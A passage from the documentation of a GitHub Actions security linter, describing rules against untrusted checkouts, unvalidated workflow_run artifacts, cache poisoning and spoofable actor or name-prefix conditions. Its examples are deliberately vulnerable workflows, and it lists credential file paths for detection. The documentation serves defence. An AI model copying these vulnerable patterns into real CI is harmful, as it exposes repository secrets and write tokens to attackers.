  - `actions/setup-node` with `cache` set to `npm`, `yarn` or `pnpm`;
  - `golangci/golangci-lint-action` unless `install-only` is true;
  - `docker/build-push-action` with a `context` that is a path of the workspace (a relative path, `${{ github.workspace }}` or `cwd://`; the default, `{{defaultContext}}` and the URL and `github.com/` contexts are remote and do not read the workspace);
  - `goreleaser/goreleaser-action` with `args` that has `release` or `build` and no `install-only` (it fails without `args`);
  - `magefile/mage-action` unless `install-only` is true (it runs `mage` with the default target when `args` is empty);
  - `gradle/gradle-build-action` and `gradle/actions/setup-gradle` with `arguments` (`setup-gradle` up to v3 runs Gradle with it; v4 and later refuse the input);
  - `cypress-io/github-action` unless `install` and `runTests` are both false and it has no `build`, `start`, `start-windows` or `command`.

`gradle/actions/setup-gradle` without `arguments` only prepares a later step. `docker/setup-buildx-action`, `pre-commit-ci/lite-action` and `browniebroke/pre-commit-autoupdate-action` run nothing of the workspace and do not count, and neither does `actions/jekyll-build-pages`.

The inline scripts of actions are not analyzed. `azure/powershell` (`inlineScript`) is not in the list of actions that run the workspace, because the rule cannot tell whether an inline PowerShell script runs files of the repository (it is not parsed). A workflow that uses it after a checkout of the code of a pull request needs a manual review.

#### What untrusted-checkout does not report

- A checkout of the base (no `ref`, or `github.event.pull_request.base.*`).
- A checkout that nothing runs (unless the option `any-checkout` is on).
- A job with an `environment:` (its reviewers decide, unless `--online` finds that it has none, see [environments without reviewers](#check-untrusted-checkout-environment)) when it checks out a commit.
- A job or step whose `if:` reads who or what started the workflow: `github.actor`, the author or labels of the pull request, `github.event.pull_request.head.repo`, `github.event.workflow_run.event`, `needs` or `steps`.
- A job or step that only runs for a pull request that was merged (`if: github.event.pull_request.merged == true`, alone or in a conjunction), for a checkout of `github.event.pull_request.merge_commit_sha` or `head.sha`: that is code that a maintainer merged, as trusted as a `push` workflow. A branch name (`head.ref`, `github.head_ref`) or `refs/pull/N/head` stays reported, because the author can still push to it.
- A job or step whose `if:` is false for the privileged events of the workflow, as far as it reads `github.event_name` (`if: github.event_name == 'workflow_dispatch'`), and a job that needs a skipped job.
- A `workflow_run` workflow when every workflow in `workflows:` is in the repository and only runs for `push`, `schedule`, `workflow_dispatch`, `release`, `merge_group` or `repository_dispatch`.
- Code that other steps fetch from an output (`ref: ${{ steps.x.outputs.sha }}`).

The rule cannot tell that a `labeled` pull request was reviewed, or that an earlier step vouched for the code in a way other than a condition on `needs` or `steps`.

In a job that sets `permissions: {}` the message does not claim a token, because the job has none, and in a job whose permissions are all `read` it says that the token can only read.

<a id="check-untrusted-checkout-environment"></a>
### Environments without reviewers (online)

`environment:` is no protection by itself: the job waits for a person only when the environment has the protection rule "required reviewers". An environment that has none (a wait timer or a branch policy alone makes nobody look at the code), or that does not exist (a typo: GitHub creates an empty one when the job runs), holds nothing back.

With `--online`, `untrusted-checkout`, `untrusted-artifact` and `agentic-actions` ask GitHub (`GET /repos/{owner}/{repo}/environments/{name}`) about the environment of a job they would otherwise skip, and report the job when the environment has no required reviewers, or does not exist in a public repository. The message says so. Without `--online`, or when the lookup does not work, the environment is trusted.

- **Which repository.** The one named by `GITHUB_REPOSITORY` (GitHub Actions sets it) or else by the `origin` remote of the clone (`github.com` only). Without either, nothing is asked.
- **Token.** The endpoint needs the permission "Actions: read" of a token, or the scope `repo` of a classic one for a private repository. A public repository shows its environments to everybody, so an anonymous run works.
- **What is not known.** A 403, and a 404 for a private repository (the token may not see the environment, or it does not exist), leave the environment trusted and count as a skipped lookup (see [online checks](online.md#online-checks)). A name that is computed (`environment: ${{ matrix.env }}`) is not looked up.
- **Requests.** One for each environment name of the run (a 404 for a public repository adds the request for the repository, which the other online checks share), and only for a workflow and a job the rule would otherwise report on. The answers are cached like the others.

In the example, the lookup finds that the environment `staging` has a wait timer and no required reviewers, so the job is reported.

Example input:

```yaml
# requires --online
on: pull_request_target
jobs:
  deploy:
    runs-on: ubuntu-latest
    # This environment of the repository has a wait timer, but no required reviewers
    environment: staging
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm ci && npm test
```

Output:

```
test.yaml:11:16: this step checks out code from a pull request (github.event.pull_request.head.sha) in a "pull_request_target" workflow and "npm" runs it afterwards. the workflow has a write token and secrets, so whoever controls that code can use them. the environment "staging" of job "deploy" has no required reviewers, so no one has to approve the run. run untrusted code in a "pull_request" workflow without secrets, or check out the base branch and only read the pull request as data. the pinned actions/checkout (v4.2.2) predates the protection that refuses the code of a fork pull request here, upgrade to v4.4.0 or later [untrusted-checkout]
   |
11 |           ref: ${{ github.event.pull_request.head.sha }}
   |                ^~~
```

<!-- Skip playground link -->

There is no automatic fix.

<a id="check-untrusted-artifact"></a>
## Untrusted artifacts in workflow_run workflows

The rule `untrusted-artifact` reports a `workflow_run` workflow that downloads an artifact of the run that triggered it and then runs it, extracts it or writes its content to `$GITHUB_ENV`, `$GITHUB_PATH` or `$GITHUB_OUTPUT` without checking it. It is in the `default` profile, at the level `error`.

Example input:

```yaml
on:
  workflow_run:
    workflows: [PR checks]
    types: [completed]
jobs:
  comment:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: pr
          path: pr
          run-id: ${{ github.event.workflow_run.id }}
          github-token: ${{ github.token }}
      - run: echo "number=$(cat pr/number)" >> "$GITHUB_ENV"
```

Output:

```
test.yaml:3:17: workflow "PR checks" specified at "workflows" of "workflow_run" event is not found in the repository. a workflow is specified by its "name:" or its file path when it has no name [workflow-run-names]
  |
3 |     workflows: [PR checks]
  |                 ^~~~~~~~~
test.yaml:9:15: this step downloads an artifact of the run that triggered the workflow, which ran the code of a pull request, and the step at line 15 writes its content to $GITHUB_ENV without validating its content first. the artifact is whatever the pull request wanted, and this workflow has a write token and secrets. match the content against a strict pattern (for example digits only) before you use it, and never run or extract it [untrusted-artifact]
  |
9 |       - uses: actions/download-artifact@v4
  |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:15:45: a value that is not a literal is written to $GITHUB_ENV in a workflow triggered by "workflow_run", which runs with secrets and a write token for events that may come from a fork. an attacker who controls the value can set LD_PRELOAD or NODE_OPTIONS (a newline adds another variable) and run code in the next steps. write only literal values and values computed from trusted sources, or pass state with $GITHUB_OUTPUT (only a value without line breaks, or one between a delimiter that nobody can guess, is safe there: see output-clobbering) [github-env]
   |
15 |       - run: echo "number=$(cat pr/number)" >> "$GITHUB_ENV"
   |                                             ^~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

The first finding comes from [`workflow-run-names`](#check-workflow-run-names): the repository has no workflow named `PR checks`. The last one comes from [`github-env`](#check-github-env), which reports the write to `$GITHUB_ENV`.

The upstream workflow ran the code of a pull request, so the artifact is whatever the pull request wanted. The `workflow_run` workflow has a write token and the secrets. A file name or a value with a newline in an environment file is enough to inject a variable such as `LD_PRELOAD` or `NODE_OPTIONS`, and an archive can write outside its directory.

**Fix.** Check the content before you use it, for example match a pull request number against `^[0-9]+$`:

```yaml
- run: |
    NUMBER=$(cat pr/number)
    [[ "$NUMBER" =~ ^[0-9]+$ ]] || exit 1
    echo "number=$NUMBER" >> "$GITHUB_OUTPUT"
```

There is no automatic fix.

**What is reported.** A download, followed by a use of the downloaded files in a later step of the same job. The download is:

- `actions/download-artifact` with a `run-id` that reads `github.event.workflow_run`;
- any use of `dawidd6/action-download-artifact` or of its forks and look-alikes that the rule knows: `aochmann/actions-download-artifact`; `blablacar/action-download-last-artifact`, which takes the last artifact of that name of any run, branch or workflow; and `bettermarks/action-artifact-download`, which has no `path` and puts the artifact under `rename` or `artifact_name`;
- `gh run download`;
- an `actions/github-script` step that calls `listWorkflowRunArtifacts` and `downloadArtifact`.

The use is a later step of the same job with a `run:` that:

- runs something inside the artifact directory (`path:`, or the artifact `name` when there is no `path`), including `cd` into it and `working-directory:`;
- extracts an archive (`unzip`, `tar -x`, `7z x`, ...) from there, or any archive after a download with `github-script`;
- writes data read from there (`cat`, `jq`, `$(...)`, `read ... < file`) to `$GITHUB_ENV`, `$GITHUB_PATH` or `$GITHUB_OUTPUT`.

A step that validates the data stops the check from there on: a regular expression match (`=~`, `grep -E`), a numeric test (`-eq`), a checksum or signature verification (`sha256sum -c`, `gh attestation verify`, `cosign verify`, ...). This is deliberately generous.

**What is not reported.**

- Artifacts of the current run.
- A download whose files cannot be linked to a later command: an artifact without `path` and `name` lands in the root of the workspace under names the rule does not know.
- Jobs with an `environment:` (with `--online`, one without required reviewers is reported, see [environments without reviewers](#check-untrusted-checkout-environment)).
- Jobs and steps with the same guards as [`untrusted-checkout`](#check-untrusted-checkout).
- Workflows that wait only for workflows that run for `push`, `schedule` and other events that only people with write access cause.

**Configure.** The option `pedantic` (on under the `pedantic` profile, `rules: {untrusted-artifact: {pedantic: true}}` for the rule alone) also reports a download that does not say which artifact it wants: `actions/download-artifact` with a `run-id` of the triggering run and no `name`, `pattern` or `artifact-ids`, `dawidd6/action-download-artifact` or `aochmann/actions-download-artifact` without `name`, and `gh run download <id>` without `-n` or `--pattern`. Such a download fetches every artifact that the run uploaded, which includes the ones that the workflow does not expect and the pull request chose to add. It is reported whether or not a later step uses the files; the same guards as for the other findings apply.

<a id="check-cache-poisoning"></a>
## Cache poisoning

The rule `cache-poisoning` reports a cache that an attacker can use to get code into a release: a cache that is restored in a release job, and a cache that a privileged trigger writes. It is in the `default` profile, at the level `error`.

Example input:

```yaml
# select: cache-poisoning
on:
  push:
    tags: ["v*"]

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6
        with:
          persist-credentials: false
      # ERROR: restores a cache in a workflow which publishes on tags
      - uses: Swatinem/rust-cache@6323deb102c322ba6fcbdcafc7e3dddab59af2b6 # v2
      # OK: the cache is not read
      - uses: Swatinem/rust-cache@6323deb102c322ba6fcbdcafc7e3dddab59af2b6 # v2
        with:
          lookup-only: true
      - run: cargo publish
```

Example config:

```yaml
rules:
  cache-poisoning: error
```

Output:

```
test.yaml:14:15: swatinem/rust-cache restores a cache although the workflow runs on pushed tags, so a poisoned cache entry can end up in the published artifacts. remove this step or set "lookup-only: true", or set "cache-mode: none" on the job [cache-poisoning]
   |
14 |       - uses: Swatinem/rust-cache@6323deb102c322ba6fcbdcafc7e3dddab59af2b6 # v2
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

Whoever can write a GitHub Actions cache entry can make a later workflow restore it, so a job that publishes artifacts should not read caches at all. In the example, the first `rust-cache` step restores a cache in a workflow that runs on pushed tags, and the second one, with `lookup-only: true`, does not read the cache.

**Fix.** Remove the step that restores the cache, set the switch of the action that turns the restore off (`lookup-only: true` for `actions/cache` and `Swatinem/rust-cache`, see the table for the others), or set `cache-mode: none` on the job or the workflow, which switches the cache off for the runner.

**Configure.** The output shows only the findings of this rule; run `jactionlint --select=cache-poisoning` to get the same on your own files. The level of the rule is set under `rules` in the [configuration file](config.md#rules); `error` is the default and `off` turns the rule off:

```yaml
rules:
  cache-poisoning: error
```

#### What counts as a release job

A job is a release job when:

- the workflow runs on the `release` event;
- the workflow runs on pushed tags (`push` with `tags:`);
- the workflow runs on pushes to release branches: `push` with a `branches:` filter whose every positive pattern is `release`, `releases` or starts with `release/`, `release-` or `releases/`. `branches: [main, 'release/**']` is the filter of ordinary checks and does not count;
- the job uses a publishing action (such as `pypa/gh-action-pypi-publish`, `softprops/action-gh-release` or `goreleaser/goreleaser-action`) or runs a publishing command (`cargo publish`, `npm publish`, `twine upload`, `gh release create`, `docker push`, ...).

The list of publishing actions covers the well-known publishers (crates.io, container registries, Homebrew bumps, Azure, Google Cloud and AWS deploys, JReleaser, Release Drafter, Vercel, Netlify, the app stores). A publisher that is not in the list is still found by its `run:` command.

`docker/build-push-action` publishes when it may push:

- With a non-empty `outputs`, `outputs` decides alone, because buildx receives it and the `push` shorthand is not applied to it. `type=registry` or `push=true` (as in `type=image,push-by-digest=true,push=true`) push. So may an `outputs` in which an expression is a whole field, a key or the value of `type` or `push`, because it may resolve to the registry (`type=local,dest=${{ runner.temp }}` only supplies a path), also next to `push: false`. A local export does not push, also next to `push: true`.
- Without `outputs`, `push` decides: anything but a false value pushes (an expression such as `push: ${{ github.event_name != 'pull_request' }}` is not known to be false, and the image is pushed on the runs where it is true), and the default is false.

#### Caches that cache-poisoning reports

In a release job the rule reports the steps that restore a cache:

| Action | Restores a cache unless |
| --- | --- |
| `actions/cache`, `actions/cache/restore` | `lookup-only: true` |
| `actions/setup-node`, `setup-python`, `setup-java`, `setup-dotnet` | the `cache` input is missing or `false` (`package-manager-cache: false` only turns off the automatic cache of `setup-node`, not an explicit `cache`) |
| `actions/setup-node` v5 and later | `package-manager-cache: false` (or an expression of it that is false on the release), or `package.json` of the repository does not name a package manager. v5 caches on its own when the top-level `packageManager` of `package.json` names npm, yarn or pnpm with a version (`pnpm@9`), and ignores `devEngines`; v6 and later cache only when `devEngines.packageManager` (any entry) or the top-level `packageManager` names `npm`. Without a repository to read (a workflow linted on its own, a composite action) the answer is "caches" |
| `docker/setup-buildx-action` v3 and later | `cache-binary: false` (it caches the buildx binary), or `version` is not set: the action downloads, and restores from the cache, a buildx only when `version` is set or the runner has none, and the images of the runners of GitHub have it. The option `pedantic` reports a use without `version` too, for a self-hosted runner without buildx |
| `actions/setup-go` | `cache: false` (before `v4` the cache is opt-in) |
| `ruby/setup-ruby` | `bundler-cache` is missing or `false` |
| `astral-sh/setup-uv` | `enable-cache: false`, or the version is v10 or later and `enable-cache` is unset or `auto` (it does not restore a cache on the events that are open to cache poisoning; the version is the tag of the `uses:`, or the version in the comment after a pinned commit, such as `# v10.0.0`) |
| `Swatinem/rust-cache` | `lookup-only: true` |
| `jdx/mise-action` | `cache: false` |
| `jdx/aube-action` | the `cache` input is missing or `false` (it restores `node_modules` with `actions/cache`) |
| `gradle/actions/setup-gradle`, `gradle/gradle-build-action` | `cache-disabled: true` |
| `docker/build-push-action` | there is no `cache-from` with `type=gha` |
| `oven-sh/setup-bun` | `no-cache: true` (it caches the bun executable) |
| `actions-rust-lang/setup-rust-toolchain` | `cache: false` |
| `mlugg/setup-zig` | `use-cache: false` |
| `pnpm/action-setup` | `cache` is missing or `false` (the input is opt-in, `false` by default) |
| `pnpm/setup` | `cache` is missing or `false` (`save-cache: false` only stops the saving, the store is still restored) |
| `graalvm/setup-graalvm` | `cache` is missing or `false` (it names the build tool, `maven`, `gradle` or `sbt`) |
| `ramsey/composer-install` | `ignore-cache` is `1`, `yes`, `Yes`, `y`, `Y`, `true` or `True`, the values that the action reads; any other value or an expression restores it |
| `PyO3/maturin-action` | `sccache` is missing or `false` and `cache` is not `sccache` (it sets `SCCACHE_GHA_ENABLED`) |
| `Mozilla-Actions/sccache-action` | `SCCACHE_GHA_ENABLED` is not set to a value other than `false` or `0`: the action only installs sccache, which uses the cache of GitHub when that variable says so. The `env` of the step, then of the job, then of the workflow decides (the most specific one that sets it), and a script of the job that mentions the variable counts as setting it unless the step does. In a composite action the variable may come from the workflow that calls it, which is not known, so the finding stays unless the step switches it off |
| `hendrikmuhs/ccache-action`, `DeterminateSystems/magic-nix-cache-action`, `awalsh128/cache-apt-pkgs-action`, `nix-community/cache-nix-action` | never: remove the step |

The list is not exhaustive: it has the actions whose caching behavior is known.

#### Tags and branches that only start checks

A `tags:` filter that lets no tag through is no tag trigger: `tags: ['!**']`, a list of negative patterns only (GitHub requires one positive pattern) and a list that ends with `!**`.

A workflow that runs on pushed tags only to start checks is not a release either, and neither is a release branch. The tag or the branch does not make a job a release job when the workflow or the job sets `permissions:` and grants nothing but read access (`read-all`, `{}`, `contents: read`), and the job:

- has no `environment:`;
- reads no secret other than `GITHUB_TOKEN`;
- runs no publishing command or action;
- hands no artifact to a job that can publish.

A job hands over when it uploads an artifact (`actions/upload-artifact`) and a job which can publish needs it, directly or through other jobs. A job can publish when it has an `environment:`, a publishing command or action, or a write permission to `contents`, `packages`, `attestations`, `pages`, `deployments` or `id-token`. A job that only comments on pull requests or reads a secret to notify a chat is not a publisher. The job that uploads builds what the other publishes, so a poisoned cache in it ends up in the release.

This is a heuristic. Without `permissions:` the token is whatever the repository sets, so the job may publish, and a job can still publish with a secret that it does not name (the secret of a reusable workflow, a credential stored on the runner). The `release` event always counts.

#### How cache-poisoning decides which jobs run on a release

The upload step and the jobs that need it are judged by their `if:` for the runs that publish, so an upload or a publisher that only runs on a manual dispatch does not count. The jobs between them are followed even when they are skipped. The rule gives every job a set of possible results among `success`, `failure`, `cancelled` and `skipped`:

- The set of the uploading job is the first three.
- The set of any other job comes from its own `if:` evaluated over the sets of the jobs it needs: `skipped` alone when the condition is false for every choice of their results, the first three when it is true for every choice, and all four when it is open (a condition that cannot be settled, or a job that is not known).
- The `if:` of the publisher is evaluated over one choice of the results at a time, from which `success()` (every needed job succeeded), `failure()` (one failed), `cancelled()` (one was cancelled), `always()` and `needs.<job>.result` all follow. Without a status function, `success()` is added.

The publisher counts as running when its condition is not false for some choice, so an open condition counts as running. A condition that is false whatever the results are (an event or a ref that the release runs do not have, such as `always() && github.event_name == 'workflow_dispatch'` on a tag) is settled first. Only the jobs that the condition names are tried one by one; past a bound on the choices the job counts as running. `always()`, `!cancelled()`, `!success()` and `!cancelled() && needs.build.result == 'success'` run after a skipped test, while `!cancelled() && needs.test.result == 'success'` with `test` skipped and `failure()` with every needed job skipped do not. A test job that only has to pass before the release hands over nothing and is not reported.

#### Steps that cache-poisoning does not report

A step is not reported when its `if:` looks at `github.event_name` or `github.ref`, or when an input is an expression which does, since that is how caching is limited to non-release runs (`enable-cache: ${{ !startsWith(github.ref, 'refs/tags/') }}`). The conditions are evaluated for the runs that publish: the release event and a push of a tag, with the tag named after each pattern of `tags:` (`preview-*` gives `preview-1.0.0`, so `if: startsWith(github.ref, 'refs/tags/preview-')` lets the run through; a pattern with other wildcards gives `v1.0.0`).

A condition that stays open is judged by the part that is not known. `github.repository == 'o/r' && !startsWith(github.ref_name, 'go/')` and `github.event_name == 'push' && !contains(needs.release.outputs.version, '-')` keep the finding, because what is not known (the repository, the output of another job) says nothing about the trigger. `github.ref == format('refs/tags/{0}', inputs.tag)` does say something, and leaves the run out.

In a composite action, a step that is given `enable-cache: ${{ inputs.enable-cache }}` (or another switch of the table) is not reported when every release workflow of the repository that calls the action passes the input as a value that switches the cache off, or leaves it out and the default of the action does. The value is a literal (`false`) or an expression such as `cache: ${{ !startsWith(github.ref, 'refs/tags/') }}`, which is evaluated for each run of the caller that publishes (the release event, a push of a tag) with the same evaluator as the `if:` conditions. An expression that cannot be evaluated there (it reads an input, the matrix or a variable) is unknown, and the finding stays.

#### Caches that privileged triggers write

The rule also reports `cache-mode: write` and `cache-mode: write-only` in a workflow that runs on `pull_request_target`, `workflow_run` or `issue_comment`: code of untrusted people writes the entries that privileged workflows restore later. Use `cache-mode: read` or `none` there. `cache-mode: none` on the workflow or on the job switches the cache off for the runner and suppresses all the findings of the rule.

#### What the option pedantic adds to cache-poisoning

The option `pedantic` (on under the `pedantic` profile, `rules: {cache-poisoning: {pedantic: true}}` for one rule) adds three things:

- A workflow that runs on pushed tags is a release whatever its permissions, and so is one whose `branches:` filter names a release branch next to others (`branches: [main, 'release/**']`, any pattern with `release` in it). These workflows are mostly checks that a tag only starts, so only the option reports them.
- `docker/setup-buildx-action` without `version` is reported, for a self-hosted runner without buildx.
- A cache whose `path` saves a file with credentials is reported.

The credential files are, for a step of `actions/cache` or `actions/cache/save`:

- in the home directory (written `~`, `$HOME` or `${HOME}`): `~/.npmrc`, `~/.docker/config.json` (or `~/.docker`), `~/.ssh` or a private key of it, `~/.config/gh`, `~/.aws`, `~/.kube`, `~/.netrc`, `~/.pypirc`, `~/.m2/settings.xml` and a few like them. A directory of the workspace with the same name belongs to the project and is not reported;
- in the workspace: `.npmrc`, `.env` and `.env.*` (not the templates `.env.example`, `.env.sample`, `.env.template`, `.env.dist` and the like), and `.git`. The config of `.git` keeps the token of `actions/checkout`, so it is reported only when the job has a checkout without `persist-credentials: false` (a job which restores `.git` before a checkout that does not persist the token has nothing to leak).

A cache is not private: a workflow of the repository that knows the key restores it, so the files are readable by whatever runs there, which includes the workflows of pull requests of the same repository. The finding is reported whatever the trigger is. It is not reported when the step has `lookup-only: true`, when the job or workflow has `cache-mode: none` or `read` (nothing is saved), and for a path inside a credential directory (`~/.ssh/known_hosts`, `~/.docker/cli-plugins`), a glob, a path with an expression, or the whole home directory or workspace. Only the option reports it, because only the files that exist when the step runs hold credentials, which the rule cannot see.

**Related.** Where this rule decides differently from zizmor is on the [zizmor parity page](zizmor-parity.md).

<a id="check-bot-conditions"></a>
## Bots trusted by `github.actor`

The rule `bot-conditions` reports a condition that trusts a bot by `github.actor`, which can be spoofed. It is in the `default` profile, at the level `error`.

Workflows trust bots such as Dependabot with a condition like `github.actor == 'dependabot[bot]'`. But `github.actor` is the account of the last event, not the author of the pull request. An attacker can build a pull request whose last commit event is made by the bot while the rest of the branch is theirs, and the condition passes.

**What is reported.** `github.actor`, `github.triggering_actor`, `github.actor_id` and `github.event.sender.*` compared with a bot account (a name with `[bot]`, or the ID of Dependabot, Renovate and github-actions) with `==`, `contains()`, `startsWith()` and `endsWith()`. A negative check such as `github.actor != 'dependabot[bot]'` is not reported, because it only skips what the condition guards.

Example input:

```yaml
on: pull_request_target

jobs:
  automerge:
    runs-on: ubuntu-latest
    # The last actor is not necessarily the author of the pull request
    if: github.actor == 'dependabot[bot]'
    steps:
      - run: gh pr merge --auto --merge "$PR_URL"
        env:
          PR_URL: ${{ github.event.pull_request.html_url }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

Output:

```
test.yaml:7:9: "github.actor" holds the account of the last event and not the author of the change, so it can be spoofed and comparing it with the bot "dependabot[bot]" does not prove that the bot made the change. check the author of the pull request instead, e.g. "github.event.pull_request.user.login" [bot-conditions]
  |
7 |     if: github.actor == 'dependabot[bot]'
  |         ^~~~~~~~~~~~
```

<!-- Skip playground link -->

**Fix.** Use `github.event.pull_request.user.login` (or `.id`), the author of the pull request. When the workflow runs on `pull_request` or `pull_request_target` only, `--fix=unsafe` makes the change. It is unsafe because the condition is true for a pull request of the bot that somebody else pushed to, where it used to be false.

#### How bot-conditions reads the events of a workflow

The rule looks at the events that can start the run, and for a reusable workflow (and the metadata of a composite action) at the events of the local workflows that call it, directly or through other reusable workflows:

- Only `pull_request` and `pull_request_target`: it suggests the author of the pull request.
- A pull request event next to others (for example `push` and `pull_request`): it reports and says that the author field exists only on the pull request runs, so the condition needs another test on the other events.
- Only `push`, `schedule`, `workflow_dispatch`, `repository_dispatch`, `release`, `create` or `delete`: it does not report. No pull request can reach the job, so there is no author of a pull request to check, and people with write access start these runs. A reusable workflow that is called only by a `push` workflow is therefore not reported for `github.event.sender.id`.
- Other events without a pull request (`issue_comment`, `workflow_run`, ...): it reports without suggesting a pull request field.
- Unknown events (a reusable workflow or an action that no workflow of the repository calls, or whose callers are themselves only called): it suggests the author of the pull request. Another repository may call it on any event.

**What is not reported.** A condition that also requires the author of the pull request to be the bot, such as `github.actor == 'dependabot[bot]' && github.event.pull_request.user.login == 'dependabot[bot]'`: the author is what proves that the bot made the change, and the actor next to it only narrows the condition.

<a id="check-unsound-contains"></a>
## Unsound contains() on a string

The rule `unsound-contains` reports an `if:` condition that calls `contains()` with a string literal as the first argument and something else as the second. It is in the `default` profile, at the level `error`.

Example input:

```yaml
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
        if: contains('refs/heads/main refs/heads/develop', github.ref)
```

Output:

```
test.yaml:7:13: contains() with the string literal "refs/heads/main refs/heads/develop" as its first argument is true for any substring of it, not only for its words. to check membership in a list pass an array instead, e.g. contains(fromJSON('["a", "b"]'), value), or compare each value with == [unsound-contains]
  |
7 |         if: contains('refs/heads/main refs/heads/develop', github.ref)
  |             ^~~~~~~~~~~~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNpMy8GuAiEMheH9PMXZzb2JM7PnbUCKYLAQ2pr49gbHhbs2/3caO3STvNxbELcAkXptr3kBw1i2KSwYq23VK4l+kih1ORWwTemwH+d4l/wNQEkO18bqC8vfOijJkclHOR6+MH7+SE+qra8X3IpmC/ug9P8eABuBMf8=)

People write it to test that a value is one of a list of words, but `contains()` on strings tests for a substring, so `contains('refs/heads/main refs/heads/develop', github.ref)` is also true for a branch named `mai` or `heads/dev`. When the condition guards a deployment or a privileged step, that is a bypass.

**Fix.** Give `contains()` an array, or compare with each value:

```yaml
if: contains(fromJSON('["refs/heads/main", "refs/heads/develop"]'), github.ref)
# or
if: github.ref == 'refs/heads/main' || github.ref == 'refs/heads/develop'
```

There is no automatic fix.

**What is not reported.** Calls where the first argument is not a literal (`contains(github.event.head_commit.message, 'skip ci')`).

**Related.** The same kind of mistake with the names of accounts and repositories is [`unsound-prefix-match`](#check-unsound-prefix-match).

<a id="check-unsound-prefix-match"></a>
## Unsound prefix matches on names

The rule `unsound-prefix-match` reports `startsWith()`, `endsWith()` and `contains()` calls that test an account, an organization or a repository by a part of its name. It is in the `default` profile, at the level `error`.

Example input:

```yaml
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: ./trusted.sh
        if: startsWith(github.actor, 'jdx')
```

Output:

```
test.yaml:7:13: startsWith(github.actor, "jdx") is also true for an account whose name only begins with "jdx", such as "jdx-evil", which anybody can create. compare the whole name with == or, for several names, test a list with contains(fromJSON('["a", "b"]'), value) [unsound-prefix-match]
  |
7 |         if: startsWith(github.actor, 'jdx')
  |             ^~~~~~~~~~~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNosyjGuwjAQRdE+q3hd/pdI6L0RysghQ+zIssPMG4nlIwPVLe5pNeD0UhaVp4txYdRdOBxttTAAFGMvoF5t6txXr/SpxP4+yyinfRUwdRkwX6lulG229DtAfgQYo9Jumelvz0y+zvHOpheMx/Ya/98DAIFtLiE=)

Names are chosen by whoever registers them, so `startsWith(github.actor, 'jdx')` is also true for `jdx-evil`, and `endsWith(github.repository, '/mise')` is true for the fork of `mise` by every owner. When the condition decides whether a privileged step runs, this is a bypass of the check.

**Fix.** Compare the whole name, or test a list of whole names:

```yaml
if: github.actor == 'jdx'
# or
if: contains(fromJSON('["jdx", "jdy"]'), github.actor)
```

There is no automatic fix, because the right comparison depends on what you mean to trust.

**What is reported.** The properties that are checked are the names of the actor, the sender, the repository owner and the authors of pull requests, issues and comments (`github.actor`, `github.triggering_actor`, `github.repository_owner`, `github.event.sender.login`, `github.event.pull_request.user.login`, and similar ones), and the full name of a repository (`github.repository`, `github.event.repository.full_name`, `github.event.pull_request.head.repo.full_name`). The literal must be the second argument; a call of `contains()` with a literal first argument is the case of [`unsound-contains`](#check-unsound-contains).

**What is not reported.**

- A prefix that ends with a slash on a repository name, as in `startsWith(github.repository, 'jdx/')`, or that has a slash in it (`jdx/mise`): the owner is complete, so only the owner can create the repository.
- A name ending with `[bot]`: GitHub appends it, so `startsWith(github.actor, 'dependabot[bot]')` is a whole name. The comparison of `github.actor` with a bot in a condition is reported by [`bot-conditions`](#check-bot-conditions) when that rule is on, so it is not reported twice.
- A negated test (`!startsWith(github.actor, 'bot-')`): it only excludes names, nobody gets in through it.
- An expression where the same property is also compared exactly in an `&&` chain (`github.actor == 'jdx' && startsWith(github.actor, 'j')`) or tested against a list of whole names, because the exact test decides. An exact test in a different `if:` (a job and a step) is not understood.
- Values that are not literals, such as `startsWith(github.actor, inputs.user)`.
- An expression outside a condition (`env:`, `with:`, `runs-on:`), unless it also refers to a secret, `github.token` or a `self-hosted` runner: `GOOS: ${{ contains(github.repository, 'windows_exporter') && 'windows' || '' }}` selects a setting, not a credential, but `token: ${{ startsWith(github.actor, 'jdx') && secrets.TOKEN }}` decides who gets one.

**Configure.** The names of branches and tags (`github.ref`, `github.head_ref`, ...) are not checked by default, since `startsWith(github.ref, 'refs/tags/v')` is usually a pattern someone means. Set the option `refs` to check them as well, except for prefixes ending with a slash:

```yaml
rules:
  unsound-prefix-match:
    level: error
    refs: true
```

**Related.** How this rule compares with zizmor is on the [zizmor parity page](zizmor-parity.md).

<a id="check-obfuscation"></a>
## Obfuscated paths and expressions

The rule `obfuscation` reports constructs that work but hide what they do from the people and the tools that read the workflow. It is in the `default` profile, at the level `error`.

**What is reported.**

- A path at `uses:` with empty, `.` or `..` segments, like `actions/checkout/./sub` or `./.github/actions/../actions/x`. A leading `../` of a local path is not reported, because it refers to a repository checked out next to the workspace.
- `format()` with literal arguments only, and any other expression that is a constant, outside of `if:` (constant conditions are reported by `constant-condition`).
- A part of an expression that has a constant result although the expression as a whole does not, such as `fromJSON(format('{{"group":{0},"labels":{1}}}', toJSON(vars.GROUP), toJSON('ubuntu-24.04')))` (`toJSON('ubuntu-24.04')` is the string `"ubuntu-24.04"`) or `inputs.deploy || 'true' && 'false'`. A call of `fromJSON()` is not one of these, it is how a workflow writes a list or an object. In an `if:` the same holds for a part of the condition, while a condition that is constant as a whole is [`constant-condition`](#if-cond-constant).
- `fromJSON(toJSON(x))`, unless `x` is a property of a context (`fromJSON(toJSON(matrix.container))` is a known way to turn the value into an object).
- An index that is computed, like `vars[format('NAME_{0}', github.job)]`. It hides which property is read. An index that is a value of the matrix (`secrets[matrix.provider.env_key]`, `fromJSON(needs.check.outputs.results)[matrix.tool].label`) is not reported: the matrix is how a workflow selects a value by name.

Example input:

```yaml
# select: obfuscation
on: push

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout/./sub@v4
